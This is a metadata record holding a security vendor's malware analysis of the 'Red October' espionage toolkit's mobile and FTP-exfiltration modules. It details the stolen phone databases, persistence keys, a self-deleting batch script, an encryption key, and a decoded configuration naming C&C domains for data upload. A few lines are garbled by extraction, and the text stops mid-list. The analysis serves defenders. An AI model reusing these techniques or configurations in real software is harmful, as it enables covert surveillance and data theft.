{
    "id": "7a5404c4-0d82-4cc6-a856-51251e5a95b4",
    "created_at": "2022-10-25T16:48:13.369299Z",
    "updated_at": "2025-03-27T02:05:42.519696Z",
    "deleted_at": null,
    "sha1_hash": "9fd39a98ef48a12695acf4bc6e1c595055c471eb",
    "title": "“Red October”. Detailed Malware Description 5. Second Stage of Attack",
    "authors": "",
    "file_creation_date": "2018-12-21T03:35:00Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 204495,
    "plain_text": "# “Red October”. Detailed Malware Description 5. Second Stage of Attack\n\n**[securelist.com/red-october-detailed-malware-description-5-second-stage-of-attack/36879/](https://securelist.com/red-october-detailed-malware-description-5-second-stage-of-attack/36879/)**\n\nBy GReAT\n\n## First stage of attack\n\n1. [Exploits](https://securelist.com/red-october-detailed-malware-description-1-first-stage-of-attack/36830/#exploits)\n2. [Dropper](https://securelist.com/red-october-detailed-malware-description-1-first-stage-of-attack/36830/#dropper)\n3. [Loader Module](https://securelist.com/red-october-detailed-malware-description-1-first-stage-of-attack/36830/#loader)\n4. [Main component](https://securelist.com/red-october-detailed-malware-description-1-first-stage-of-attack/36830/#main-component)\n\n## Second stage of attack\n\n1. [Modules, general overview](https://securelist.com/red-october-detailed-malware-description-2-second-stage-of-attack/36842/)\n2. [Recon group](https://securelist.com/red-october-detailed-malware-description-2-second-stage-of-attack/36842/)\n3. [Password group](https://securelist.com/red-october-detailed-malware-description-3-second-stage-of-attack/36802/)\n4. [Email group](https://securelist.com/red-october-detailed-malware-description-3-second-stage-of-attack/36802/)\n5. [USB drive group](https://securelist.com/red-october-detailed-malware-description-3-second-stage-of-attack/36802/)\n6. [Keyboard group](https://securelist.com/red-october-detailed-malware-description-3-second-stage-of-attack/36802/)\n7. [Persistence group](https://securelist.com/red-october-detailed-malware-description-4-second-stage-of-attack/36884/)\n8. [Spreading group](https://securelist.com/red-october-detailed-malware-description-4-second-stage-of-attack/36884/)\n9. [Mobile group](https://securelist.com/red-october-detailed-malware-description-5-second-stage-of-attack/36879/)\n10. [Exfiltration group](https://securelist.com/red-october-detailed-malware-description-5-second-stage-of-attack/36879/)\n\n## 9. Mobile group\n\n### iPhone module\n\nKnown file location: %PROGRAMFILES%Windows NTiTunesNotifSrv.exe\n\nKnown variants:\n\n**Compilation date**\n\n**MD5** **(encrypted)** **Compilation date (payload)**\n\nee2e21a45a018c6faa68332a32c65ddd 2011.11.04 12:30:41 (GMT) 2011.11.04 10:19:11 (GMT)\n\n339b8bc0f6e5ee4ca2bc2109f5de0b38 2011.11.21 12:07:46 (GMT) 2011.11.21 08:20:01 (GMT)\n\n76e1d54a890befed31a369ce40b44ee6 2011.11.21 12:06:49 (GMT) 2011.11.21 08:20:01 (GMT)\n\nThe file is a PE EXE file, compiled with Microsoft Visual Studio 2010.\n\nCreates event named “sdjvkbasyfvbalvjklas”.\n\n#### Summary\n\nWrites encrypted log files:\n\n\n-----\n\nwhere %p is derives from the result of GetTickCount() API function.\n\nLog files are encrypted with a custom encryption algorithm based on AMPRNG.\n\nWhen started, the module writes the following registry value to be executed each time Windows\nstarts:\n\nHKCUSOFTWAREMicrosoftWindowsCurrentVersionRuniTunes Notification Service=%path to\nself%\nThen, it locates the ITunes mobile device DLL and “CoreFoundation.dll” and resolves the\nfollowing API functions:\n\nAMDeviceNotificationSubscribe\nAMRestoreRegisterForDeviceNotifications\nAMDeviceConnect\nAMDeviceIsPaired\nAMDeviceValidatePairing\nAMDeviceStartSession\nAMDeviceStartService\nAFCConnectionOpen\nAFCConnectionClose\nAMDeviceCopyValue\nAFCDirectoryOpen\nAFCDirectoryRead\nAFCDirectoryClose\nAFCFileInfoOpen\nAFCKeyValueRead\nAFCKeyValueClose\nAFCFileRefOpen\nAFCFileRefRead\nAFCFileRefWrite\nAFCFileRefClose\nAMDeviceDisconnect\n__CFStringMakeConstantString\n\nIf succeeded, the module calls AMDeviceNotificationSubscribe to set up own callback for the\niOS device connection/disconnection events.\n\nIn the Device notification callback function, the module logs each connection and disconnection\nevent. When a device is connected, it starts a new thread that manipulates this device.\n\n#### Device connection thread\n\nThe module establishes a connection to the device using AMDeviceConnect, AMDeviceIsPaired,\nAMDeviceValidatePairing and finally, AMDeviceStartSession.\n\nThen, it starts the following services on the device: “com.apple.afc2”, “com.apple.afc”.\n\nThe service “com.apple.afc2” is usually created when the device was jailbroken, so the module\n\n\n-----\n\nThe module reads device settings using AMDeviceCopyValue. The following settings are\nreferenced by name:\n\nUniqueDeviceID\nDeviceClass\nDeviceName\nModelNumber\nProductType\nProductVersion\nBuildVersion\nSerialNumber\nActivationState\nSIMStatus\nInternationalMobileEquipmentIdentity\nInternationalMobileSubscriberIdentity\nIntegratedCircuitCardIdentity\nPhoneNumber\nWiFiAddress\nBluetoothAddress\nTimeZone\nFirmwareVersion\nBasebandVersion\nBasebandBootloaderVersion\n\nAlso, it traverses the whole directory tree and stores the complete file listing in the log.\n\nThen, it checks if device is jailbroken by\n\naccessing the directory “/Applications” using AFCFileInfoOpen\nchecking if the service “com.apple.afc2” was started\n\nThe results are written in the log file.\n\nThen, it builds a complete directory listing, starting from the root directory or “/private/var”\n(sample ee2e21a45a018c6faa68332a32c65ddd only). It also searches and retrieves all files\nwith following extensions:\n\n.jpg .jpeg.txt .doc .docx .xls .xlsx .ppt .pptx .dot .dotx .odt .djvu .odts .reg .rtf .zip .rar .pdf .7z\n.wab .pab .vcf .ost .wav .mp4 .m4a .amr .log .cer .em .msg .arc .key .pgp .gpg\n\nAlso, it tries to retrieve the contents of the following files:\n\n/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb\n/private/var/mobile/Library/SMS/sms.db\n/private/var/mobile/Library/CallHistory/call_history.db\n/private/var/mobile/Library/Notes/notes.db\n/private/var/mobile/Library/Caches/locationd/consolidated.db\n/private/var/mobile/Library/Calendar/Calendar.sqlitedb\n/private/var/mobile/Library/Voicemail/voicemail.db\n\n\n-----\n\n/private/var/mobile/Library/WebKit/Databases/https_m.mg.mail.yahoo.com_0/0000000000000002.db\n/private/var/mobile/Library/WebKit/Databases/https_m.mg.mail.yahoo.com_0/0000000000000003.db\n/private/var/mobile/Library/WebKit/Databases/https_m.mg.mail.yahoo.com_0/0000000000000004.db\n/private/var/mobile/Library/WebKit/Databases/https_m.mg.mail.yahoo.com_0/0000000000000005.db\n/private/var/mobile/Library/WebKit/Databases/https_m.mg.mail.yahoo.com_0/0000000000000006.db\n/private/var/mobile/Library/WebKit/Databases/https_m.mg.mail.yahoo.com_0/0000000000000007.db\n/private/var/mobile/Library/WebKit/Databases/https_m.mg.mail.yahoo.com_0/0000000000000008.db\n/private/var/mobile/Library/WebKit/Databases/https_m.mg.mail.yahoo.com_0/0000000000000009.db\n/private/var/mobile/Library/WebKit/Databases/https_mail.google.com_0/0000000000000001.db\n/private/var/mobile/Library/WebKit/Databases/https_mail.google.com_0/0000000000000002.db\n/private/var/mobile/Library/WebKit/Databases/https_mail.google.com_0/0000000000000003.db\n/private/var/mobile/Library/WebKit/Databases/https_mail.google.com_0/0000000000000004.db\n/private/var/mobile/Library/WebKit/Databases/https_mail.google.com_0/0000000000000005.db\n/private/var/mobile/Library/WebKit/Databases/https_mail.google.com_0/0000000000000006.db\n/private/var/mobile/Library/WebKit/Databases/https_mail.google.com_0/0000000000000007.db\n/private/var/mobile/Library/WebKit/Databases/https_mail.google.com_0/0000000000000008.db\n/private/var/mobile/Library/WebKit/Databases/https_mail.google.com_0/0000000000000009.db\n\nCollected information including iOS device configuration variables, file listings and file contents\nis written to the file “%TMP%iTunes_ddsa_%p.tmp”. This file is encrypted and compressed with\nZlib.\n\n#### Log file format\n\nThe log starts with a MAGIC number 0x5C63F935, then 0x14 bytes of 0xFF, DWORD length of\nheader, header data, then log data.\n\nThe data consists of tagged records. The following tag values are known to us:\n\n0x8002 Time/date\n0x8004 SHA1 of MAC address, System Volume Serial Number, IE Product ID, the same is written\nin HKCU,HKLMSOFTWAREMicrosoftADOSoftware32, “ProductID”\n0x8005 Log ID / header\n0x8006 Log data\n\nCompressed directory log starts with magic 0x5C63F934.\n\n### Nokia module\n\nKnown variants\n\n**MD5** **Compilation date**\n\n6ebcb0b7f9cca7cecebbd683685cb705 2011.11.0211:42:09 (GMT)\n\n#### Summary\n\nPE Exe file compiled with Microsoft Visual C++ 2008.\n\nCreates log file with “%TMP%adobe_upd_imhbfex_%p_%p.dat” file name where %p depends on a\nresult of GetTickCount() function.\n\n\n-----\n\nlibraries (exits if unsuccessful and writes to log “ERROR LOADING ConnAPI.dll: ‘%d'” and\n“EXITING…”) followed by “SUCCESS LOADING ConnAPI.dll: ‘%d’n'” string written to log file and\ntime stamp.\n\n**Note: Each event which is written to a log file is followed up with time stamp which is written in**\na log file prepended by a string in the following format: [%04d-%02d-%02d %02d:%02d:%02d]\n(year-month-day hour-minute-second).\n\nWrites to log “===========PROGRAM_STARTED_V_0.1=======” followed by time stamp.\n\nCreates mutex with “sysvolumecheckasdfg” name and checks if program is already running. If\nyes, then it writes to log “PROGRAM IS ALREADY RUNNING – EXITING &” and exits.\n\nCreates registry key SOFTWAREMicrosoftWindowsCurrentVersionRunStartup%path_to_file%\n\nIt resolves the following API functions from ConnAPI.dll:\n\nCONAAllocString\nCONAAllocStringMB\nCONAFreeString\nCONAAllocMemory\nCONAFreeMemory\nCONAOpenDM\nCONACloseDM\nCONASetDeviceListOption\nCONAGetDeviceCount\nCONAGetDevices\nCONAGetDevice\nCONAFreeDeviceStructure\n\n\n-----\n\nCONARenameFriendlyName\nCONARegisterNotifyCallback\nCONARegisterDMNotifyIF\nCONASearchDevices\nCONAFreeConnectionInfoStructures\nCONAChangeDeviceTrustedState\nCONAGetDeviceInfo\nCONAFreeDeviceInfoStructure\nCONAModemConfig\nCONAFreeModemConfigData\nCONAOpenFS\nCONACloseFS\nCONARegisterFSNotifyCallback\nCONARegisterFSNotifyIF\nCONARefreshDeviceMemoryValues\nCONAGetMemoryTypes\nCONAGetMemoryValues\nCONASetCurrentFolder\nCONAGetCurrentFolder\nCONAFindBegin\nCONAFindNextFolder\nCONAFindNextFile\nCONAFindEnd\nCONACreateFolder\nCONADeleteFolder\nCONARenameFolder\nCONAGetFolderInfo\nCONAMoveFolder\nCONACopyFolder\nCONAGetFileInfo\nCONADeleteFile\nCONAMoveFile\nCONACopyFile\nCONARenameFile\nCONAReadFile\nCONAWriteFile\nCONAReadFileInBlocks\nCONAWriteFileInBlocks\nCONACancel\nCONAFreeFileInfoStructure\nCONAFreeFolderInfoStructure\nCONAFreeFolderContentStructure\nCONAAllocFileDataMemory\nCONAFreeFileDataMemory\nCONAInstallApplication\nCONAListApplications\nCONAU i llA li i\n\n\n-----\n\nCONAConvertFile\nCONAGetConvertFileTypes\nCONAFreeConvertFileTypes\n\nIt resolves the following API functions from DAAPI.dll:\n\nCAGetAPIVersion\nDAOpenCA\nDACloseCA\nCAGetFolderInfo\nCAFreeFolderInfoStructure\nCAGetIDList\nCAFreeIdListStructure\nCABeginOperation\nCAReadItem\nCAWriteItem\nCADeleteItem\nCAWriteField\nCADeleteField\nCACommitOperations\nCAEndOperation\nCAFreeItemData\nCARegisterNotifyCallback\nCARegisterOperationCallback\n\nIf succeeded the module calls CONAOpenDM function which opens the device management\nconnection and returns a handle to the device management context. If succeeded a module\ncalls CONARegisterNotifyCallback and to register a callback function for the device list\nnotifications and writes to log “I AM WORKING…”. If device was connected it starts a new thread\nto get information from the device.\n\nThe module uses CONARefreshDeviceList, CONASetDeviceListOption, CONAGetDeviceCount,\nCONAGetDevices and CONAGetDevice API functions to obtain a device which will be\nmanipulated.\n\nIf a device was connected the module writes to log “!!!————– DEVICE ATTACHED:\n‘%s’————— !!!”.\n\nIt calls GetDeviceInfo function to get the following information about the connected device:\ntype, name, software version, used language, synchronization support. A module also gets\ninformation about device memory, device model, IMEI number, device file system. Obtained\ninformation is written to the log file.\n\n#### Messages:\n\nExtracts inbox, outbox, sent, archive messages, drafts, templates, SMS/MMS messages from\nuser’s folders with statuses ‘SENT’, ‘UNREAD’, ‘READ’, ‘DRAFT’, ‘PENDING’, ‘DELIVERED’,\n‘SENDING’, or with undefined status ‘UNDEFINED MESSAGE_STATUS’ or ‘UNDEFINED FOLDER\nID’. SMS and MMS messages are written separately to a log file.\n\n\n-----\n\nExtracts meetings, birthdays, memos, reminders, notes, ‘To Do’ lists with repetition attributes\n‘NONE’, ‘ILY’ (I suppose it means ‘DAILY’ but authors must have mistyped), ‘WEEKLY’,\n‘MONTHLY’, ‘YEARLY’ or ‘Unknown’; with priority attributes ‘HIGH’, ‘NORMAL’, ‘LOW’ or\n‘Unknown’; with action attributes ‘NEEDS_ACTION’, ‘COMPLETED’ or ‘Unknown’; with alarm\nattributes ‘NOT_SET’, ‘SILENT’, ‘WITH_TONE’ or ‘UNKNOWN’; with starting/ending time, subject,\nlocation and status. The module writes everything to a log file.\n\n#### Contacts:\n\nExtracts all contacts with the following fields: ME, FROMAL_NAME, MIDDLE_NAME, ST_NAME,\nTITLE, SUFFIX, COMPANY, JOB_TITLE, BIRTHDAY, NICKNAME, GENERAL_NUMBER,\nHOME_NUMBER, WORK_NUMBER, PREF_NUMBER, R_NUMBER, GER_NUMBER,\nMOBILE_NUMBER, MOBILE_HOME_NUMBER, MOBILE_WORK_NUMBER, X_NUMBER,\nX_HOME_NUMBER, X_WORK_NUMBER, VIDEO_CALL_NUMBER, VOIP_NUMBER,\nVOIP_HOME_NUMBER, VOIP_WORK_NUMBER, POSTAL_ADRESS, BUSINESS_POSTAL_ADRESS,\nHOME_POSTAL_ADRESS, EMAIL_ADRESS, HOME_EMAIL_ADRESS, WORK_EMAIL_ADRESS,\nWEB_ADRESS, HOME_WEB_ADRESS, WORK_WEB_ADRESS, PTT_ADRESS, VIDEO_ADRESS,\nSWISS_ADRESS. The module writes everything to a log file.\n\n#### Applications:\n\nRetrieve information about applications which have already been installed on a device. Also\nmonitors if user installs/uninstalls any SIS/SISX/J2ME application. The module writes\neverything to a log file.\n\n#### File types:\n\nLooks for files from root directory (txt, cdb, doc, docx, xls, xlsx, ppt, pptx, dot, dotx, odt, djvu,\nodts, reg, rtf, zip, rar, pdf, 7z, wab, pab, vcf, ost, jpg, waw, mp4, m4a, amr, exe, log, cer, eml, msg,\narc, key, pgp, gpg) and tries to retrieve them.\n\n### Modules for Windows Mobile\n\n#### Windows files\n\nKnown files\n\nMD5 Compilation date (encrypted)\n70bee4d4141e6d963aa72a0da08b6683 11:14:22, July 8, 2011\n09b4f1e0c03d7dbdac402df4c0625167 15:52:36, October 19, 2010\n\n**70bee4d4141e6d963aa72a0da08b6683 (724992 bytes)**\n\nPE Exe file compiled with Microsoft Visual C++ 2005.\n\nCreates log file in the following path ‘%%TMP%%tmp_m.%p.%p.dat’ where all information about\nthe module’s work will be written and writes ‘Application starting, version 2.0.0.2, obj: %s’.\nModule uses the same time/date format as in the Nokia module (‘year-month-date hoursminutes-seconds’) after every new log entry.\n\n\n-----\n\nCeSHCreateShortcut\n\nCeGetSpecialFolderPath\nCeFindClose\n\nCeFindFirstFile\n\nCeRegEnumKeyEx\n\nCeRegEnumValue\n\nCeWriteFile\n\nCeCreateFile\n\nCeReadFile\n\nCeCreateProcess\n\nCeCloseHandle\n\nCeDeleteFile\n\nCeGetLastError\n\nCeRegQueryValueEx\n\nCeRegCloseKey\n\nCeRegCreateKeyEx\n\nCeRegSetValueEx\n\nCeRegOpenKeyEx\n\nCeRapiUninit\n\nCeRapiInitEx\n\nCeRapiInit\n\nAfter that it checks the ActiveSync version and writes information to a log file.\n\nCreates event ‘dfjsbnegisfgsafgdsgcxrte’.\n\nDeletes ‘ActiveSync Connection Service’ value in\n‘SOFTWAREMicrosoftWindowsCurrentVersionRun’. If the module wasn’t able to delete this value\nit creates ‘delex.bat’ file in TMP folder:\n\n:Repeat\ndel ‘path_to_itself’\nif exist ‘path_to_itself’ goto Repeat\ndel “C:DOCUME~1’USER_NAME’LOCALS~1Tempdelex.bat”\n\nA d ft th t l h it\n\n\n-----\n\nModule uses WaitForSingleObject API function and waits for a device to be connected. If device\nis connected then it writes ‘Device connected’ to a log file and calls a subroutine which\ninitializes a connection and gets information like devices’ name, OS version, CLSID which is\nwritten to a log file.\n\nThe module also checks the associations (in a registry of a device) between certain file types\nand applications for these file types on a device and writes this information to a log file:\n\nPDF (PDF viewer): pdf\n\nWCELOAD (CAB file installer): cab\n\nWMPLAYER (Windows Media Player): mp4, 3gp, amr, avi, wav, wma, wmv, asf, midi, aac, mp3d,\nmp3\n\nIEXPLORE1 (Internet Explorer): res, wsp, file, https, ftp, http, url, ico, html, xml, xhtml, xsl\n\nPPT (Pocket PowerPoint): ppt, pps, pptx, pptm, ppsx, ppsm\n\nPIMG (Pocket image viewer): jfif, gif, png, bmp, jpg\n\nPXL (Pocket Excel): pxl, pxt, xls, xlt, xlsx, xltx, xlsm, xltm\n\nPWORD (Pocket Word): rtf, psw, dot, dotx, docx, docm, dotm, pwt, doc, txt\n\n#### Working with Windows Mobile device\n\n**XML Provisioning**\n\nFirst the module tries to inject an XML provisioning document on a device.\n\nLoads the provisioning doc on a device:\n\n4119 – This setting grants the system administrative privileges held by SECROLE_MANAGER to\nother security roles. Value ’16’ is User Authenticated role.\n\n4101 – This setting indicates whether unsigned .cab files can be installed on the device. Value\n‘222’ indicates that only OEM, Operator, Manager, UserAuth, UserUnAuth, Operator-TPS can run\nunsigned .cab file.\n\n4102 – This setting indicates whether unsigned applications are allowed to run on Windows\nMobile devices. Value ‘1’ indicates that unsigned applications are allowed to run on the device.\n\n4097 – This setting restricts the access of remote applications that are using Remote API\n(RAPI) to implement ActiveSync operations on Windows Mobile devices. Value ‘1’ indicates full\naccess to ActiveSync is provided. RAPI calls are allowed to process without restrictions.\n\n4123 – This setting specifies which security model is implemented on the device. Value ‘1’\nindicates that a one-tier security model is enabled. A device with one-tier access focuses only\non how an application should run based on whether the application is signed with a certificate in\nthe device certificate store. There is no concern with permission restriction.\n\n4122 – This setting indicates whether a user is prompted to accept or reject unsigned .cab,\nth dll d fil V l ‘1’ i di t th ill t b t d\n\n\n-----\n\n**NB: all injected modules below are copied to ‘Windows’ directory on a Windows Mobile device.**\n\nIf XML provisioning doc was injected successfully the module tries to install the so-called\n‘Zakladka’ module with ‘winupdate.dll’ name.\n\nAfter ‘Zakladka’, the module injects the ‘winupdate.cab’ file, which is a provisioning XML file in\narchive with a certificate inside. The certificate is encoded with Base64.\n\nAfter ‘winupdate.cab’ module injects the ‘winupdate.cfg’ file, which is a configuration file that\ncontains mobile country codes with mobile network codes.\n\nAfter ‘winupdate.cfg’ the module injects ‘calc.exe’ file, an application for removing other\nmodules from Windows Mobile device.\n\nThe module then creates backup file ‘Windowswinupdate.dat’ with ‘zakladka’ and other\nWindows Mobile modules inside. The backup file is encrypted with RC4 and ‘q12ioptyhednv347’\nkey.\n\nThe module creates WinUpdate.exe (‘Windows’ folder, ‘zakladka’ inside) and WinUpdate.lnk\n(‘WindowsStartUp’ folder).\n\nAfter ‘calc.exe’ the module injects consequentially ‘word.exe’, ‘excel.exe’, ‘ppoint.exe’,\n‘pdf_viewer.exe’, ‘wmplauer.exe’, ‘img.exe’, ‘iexplorer.exe’, ‘wceloader.exe’ modules and changes\nfile associations on the device. E.g. all Word files and other text documents will be opened with\n‘word.exe’, all images will be opened with ‘img.exe’, etc.\n\nFile ‘pdf_viewer.exe’ is an application for launching other Windows Mobile modules. After that it\ntries to launch ‘pdf_viewer.exe’ on a Windows Mobile device using ‘CeCreateProcess’ API\nfunction from rapi.dll library.\n\n**09b4f1e0c03d7dbdac402df4c0625167 (393216 bytes)**\n\nPE Exe file compiled with Microsoft Visual C++ 2005.\n\nCreates mutex ‘dfgbsdfjvabufqgwiffuvh4’.\n\nCreates log file ‘%%TMP%%tmp_mu.%p.%p.dat’ and writes to a log file, ‘Updater started, Version\n1.0.0.0 s’. The module uses the same time/date format as in the Nokia module (‘year-monthdate hours-minutes-seconds’) after every new log entry.\n\nOpens event ‘dfjsbnegisfgsafgdsgcxrte’. Initializes RAPI.dll and following API functions:\n\nCeRegEnumKeyEx\nCeRegEnumValue\nCeWriteFile\nCeCreateFile\nCeReadFile\nCeCreateProcess\nCeCloseHandle\nCeDeleteFile\nCeGetLastError\n\n\n-----\n\nCeRegCreateKeyEx\nCeRegSetValueEx\nCeRegOpenKeyEx\nCeRapiUninit\nCeRapiInitEx\nCeRapiInit\n\nCreates thread ‘dfjssdfgsdffgdsgcxrte’ and ‘delex.bat’ file in TMP folder (for deleting itself if the\nmutex hasn’t been created or after it finished its work):\n\n:Repeat\ndel ‘path_to_itself’\nif exist ‘path_to_itself’ goto Repeat\ndel “C:DOCUME~1’USER_NAME’LOCALS~1Tempdelex.bat”\n\n#### Windows Mobile device thread\n\nThis module uses the WaitForSingleObject API function and waits for a device to be connected.\nIf a device is connected then it writes ‘Device connected’ to a log file and calls a subroutine\nwhich initializes a connection and gets information like the device’s name, OS version, CLSID, all\nof which is written to a log file.\n\nInjects ‘Update.exe’ file to ‘Windows’ directory with ‘Update.exe’ name. After that it tries to\nlaunch a file on a Windows Mobile device using ‘CeCreateProcess’ API function from rapi.dll\nlibrary.\n\n#### Windows Mobile files\n\nKnown variants\n\n**“Size**\n\n**(in**\n\n**Internal** **bytes)**\n\n**File name** **name** **MD5** **Compilation date** **“**\n\nwinupdate.dll zakladka 797541f87e2e3a9a0754a097772f3192 12:00:01, July 7, 2011 111944\n\n\ncalc.exe d41d8cd98f00b204e9800998ecf8427e 11:57:11,December 20,\n2010\n\nexcel.exe 93638cbba11d52b933d5da553048899e 11:57:10,December 20,\n2010\n\niexplorer.exe 06ff2157f98f312ceaa19cbef996660d 11:57:10,December 20,\n2010\n\nimg.exe 54c86037d2650630718180f24ce6f9d2 11:57:09,December 20,\n2010\n\npdf_viewer.exe 4af92c1758158644e50ddf32d9a74501 11:57:08,December 20,\n2010\n\npowerpoint.exe e4c84caaf52b42d9615d2b35acda271a 11:57:09,December 20,\n2010\n\nwceloader.exe 135eab2135cb589c655d75bc25921d8c 11:57:09,December 20,\n2010\n\n\n13824\n\n7168\n\n7168\n\n7168\n\n7168\n\n7168\n\n7168\n\n\n-----\n\n2010\n\nword.exe ea1e4cdf4072fd19fb97df2b7d88055a 11:57:08,December 20,\n2010\n\nUpdate.exe 95914229c080a998b33d7dbcb199b231 14:01:15, October 19,\n2010\n\n#### Backdoor component\n\nFile name: winupdate.dll\nInternal name: zakladka\n\nPE Exe file compiled with Microsoft Visual C++ 2005\n\nCreates log file ‘Temptmp%p.dat’.\n\n\n7168\n\n59392\n\n\nModule loads XML provisioning doc (see above in Windows Mobile module for Windows).\n\nModule obtains MCC (Mobile Country Code) and MNC (Mobile Network Code) from\nwinupdate.cfg file of infected device and writes this information to a log file.\n\nModule tries to send in a C&C interaction loop a POST request to win-check-update.com (if that\ndomain is unavailable, it sends a request to mobile-update.com):\n\n‘POST %s HTTP/1.0 Accept: */* User-Agent: Mozilla/4.0 Content-Length: %d Host: %s’\n\nAs a response from a remote server, the module receives a file which is stored in\nWindows%u.exe file and executed.\n\nC&Cs:\n\n**win-check-update.com**\n**mobile-update.com**\n\n#### Eraser component\n\nFile name: calc.exe\nPE Exe file compiled with Microsoft Visual C++ 2005\n\nCreates process ‘MobileCalculator.exe’. Decrypts file ‘WindowsWinUpdate.dat’ with\n‘q12ioptyhednv347’ key. Deletes files ‘word.exe’, ‘excel.exe’, ‘ppoint.exe’, ‘img.exe’,\n‘wmplauer.exe’, ‘iexplorer.exe’, ‘wceloader.exe’, ‘pdf_viewer.exe’, ‘WinUpdate.exe’, from\n‘Windows’ directory. Retrieves type and data from ‘SystemExplorerShell FoldersStartUp’ registry\nkey. Deletes ‘WinUpdate.lnk’ file.\n\n#### Launcher components\n\nFile names: pdf_viewer.exe, word.exe, excel.exe, iexplorer.exe, img.exe, powerpoint.exe,\nwceloader.exe, wmplauer.exe\n\nAll files are compiled with PE Exe file compiled with Microsoft Visual C++ 2005.\n\nAfter launch, the module tries to configure device with an XML provisioning document. All the\nvalues and fields in this XML (it is stored inside file) are the same as in Windows Mobile module\nfor Windows.\n\n\n-----\n\nwinupdate.cab (previously uploaded to the device by Windows module to ‘Windows’ directory)\nwith ‘/silent /noui’. These parameters make the installation completely hidden from user.\n\nCreates a registry key ‘ServicesWindows Update’ and registers file ‘Windowswinupdate.dll’ as a\nservice using the ‘RegisterService’ API function (launches it).\n\nLaunches ‘calc.exe’ (Remover) file from ‘Windows’ directory. After that it launches legitimate\napplications (like pword.exe, pxl.exe, iexplore1.exe or others) which are associated with certain\nfile types.\n\n#### Updater component\n\nFile name: Update.exe\nPE Exe file compiled with Microsoft Visual C++ 2005.\n\nModule launches a Windows Mobile application wceload.exe (CAB installer) on a file\n‘Windowscert.cab’ with ‘/silent /noui’. These parameters make the installation absolutely hidden\nfrom user.\n\n## 10. Exfiltration group\n\n### WNFTPSCAN module\n\nKnown variants:\n\n**MD5** **Compilation date (payload)**\n\n8bcd66ce8904e87f5cdfc1ad5b071ccb 2012.09.05 07:02:32 (GMT)\n\n931391d484ff56b0a142f64ee47aff88 2012.09.05 07:02:32 (GMT)\n\n#### Summary\n\nThe file is a PE DLL file without exported functions, compiled with Microsoft Visual Studio 2010.\nAll the functionality is implemented in the DllMain function.\n\nThis module is a simple non-interactive FTP client. It is used to go through all subdirectories on\nspecified FTP server, using credentials specified in config/script stored in its resource section.\nThe main purpose of this module is to make directory listings, copy files of interest (JPG, DOC,\nPPT, XLS, EMF, PDF) which are smaller than 1 MB and not older than specified date. The module\nis also capable of checking if remote FTP directories are available for write-access, but this\nfunctionality is currently not used.\n\n#### DllMain\n\nWhen loaded, the module retrieves its resource of type “BBB” and name “AAA”, and starts an\ninternal plugin framework. The main function of the module is named “task_wnftpscan” and is\nregistered in the framework. Then, it starts the framework main loop, effectively parsing the\nresource data and executing the list of actions encoded in the resource.\n\nThe decoded resource data for the known sample can be represented as the following script:\n\n\n-----\n\nSetOption(conn_a.VER_SESSION_ID, %removed%)\nSetOption(conn_a.SEND_DELAY_TIME, [5] “2000”)\nSetOption(conn_a.D_CONN, [65] “windowscheckupdate.com;windowsgenuine.com;windowsonlineupdate.com”)\nSetOption(conn_a.D_MODE, 0x0033)\nSetOption(conn_a.D_NAME, [15] “/cgi-bin/win/cab”)\nSetOption(conn_a.D_PASS, 0x00)\nSetOption(conn_a.D_RPRT, [3] “80”)\nSetOption(conn_a.D_SPRT, [3] “80”)\nSetOption(conn_a.D_USER, [21] %removed% )\nSetOption(conn_a.J_CONN, [65] “windowscheckupdate.com;windowsgenuine.com;windowsonlineupdate.com”)\nSetOption(conn_a.J_MODE, 0x0033)\nSetOption(conn_a.J_NAME, [15] “/cgi-bin/win/wcx”)\nSetOption(conn_a.J_PASS, 0x00)\nSetOption(conn_a.J_RPRT, [3] “80”)\nSetOption(conn_a.J_SPRT, [3] “80”)\nSetOption(conn_a.J_USER, [21] %removed% )\nSetOption(ftp_host, %removed% )\nSetOption(ftp_port, %removed% )\nSetOption(ftp_user, %removed% )\nSetOption(ftp_pass, %removed% )\nSetOption(ftp_crdir, “0” )\nSetOption(ftp_getlist, “1” )\nSetOption(ftp_max_file_size, “1000000” )\nSetOption(ftp_min_file_size, “10” )\nSetOption(ftp_file_time, “2012-10-30 00:00:00” )\nSetOption(ftp_file_ac_re)\nSetOption(ftp_ac_re, “.*.jpg” )\nSetOption(ftp_ac_re, “.*.jpeg” )\nSetOption(ftp_ac_re, “.*.doc” )\nSetOption(ftp_ac_re, “.*.docx” )\nSetOption(ftp_ac_re, “.*.txt” )\nSetOption(ftp_ac_re, “.*.xls” )\nSetOption(ftp_ac_re, “.*.xlsx” )\nSetOption(ftp_ac_re, “.*.ppt” )\nSetOption(ftp_ac_re, “.*.pptx” )\nSetOption(ftp_ac_re, “.*.emf” )\nSetOption(ftp_ac_re, “.*.pdf” )\nCall(task_wnftpscan)\n\n#### Main function (task_wnftpscan)\n\nThe config defines parameters for the method task_wnftpscan, which uses WinInet library\nfunctions to connect to remote FTP server using parameters set in the config and iterate trough\ndirectories.\n\n\n-----\n\ncode log every directory listing. Option ftp_crdir is set to 0, which prevents the code from\nchecking if write-access is available. If it was set to 1 in the config, then the module would try to\ncreate “tmp” subdirectory in every remote directory it goes in. There are max and min file size\nconstraints, set to 1MB and 10 bytes respectively.\n\nAdditionally there is a date constraint which is set to 2012-10-30, indicating the earliest date of\ninterest. Seems that attackers have already fetched files before that date.\n\nWhen writing to the in-memory logs the module prints a banner “FtpClient V4.0”, which is\nprobably an alternative name for the module or the code was reused from some other project. In\nthe end of work it adds “WMFTPSCAN END” to the log.\n\nAfter collecting logs and fetching files in memory, the module compiles all data together,\ncompresses using Zlib methods, encrypts, encodes with Base64 and uploads to one of the\ncommand and control servers specified in the config.\n\nThis module doesn’t change registry, nor does it created any local files.\n\nAfter completing FTP directory scanning and file retrieval, the module sends logs and collected\nfiles to the C&C server. The connection options are retrieved from the configuration (resource):\n\n**Option name** **Description**\n\nD_CONN List of C&C domain names, separated by\n‘;’\n\nD_RPRT C&C server port\n\nD_NAME Relative URL to send request\nto\n\nThe data send to the C&C server is compressed with Zlib and encrypted with a modified PKZIP\nstream cipher, and then it is Base64-encoded.\n\n### GetFileReg module\n\nKnown variants (all share the same code section, differ in resources):\n\n**MD5** **Compilation date (payload)**\n\n163CEE95FA3EF1469030F0BFEC0EB64C 2011.07.18 07:03:52 (GMT)\n\nCC0F35631D7F69EB087F31754FA9635A 2011.07.18 07:03:52 (GMT)\n\nE8711B9DBB3E7A6FBC1DF70F7131520C 2011.07.18 07:03:52 (GMT)\n\n469F4B81A01B1577531812385CAC827E 2011.07.18 07:03:52 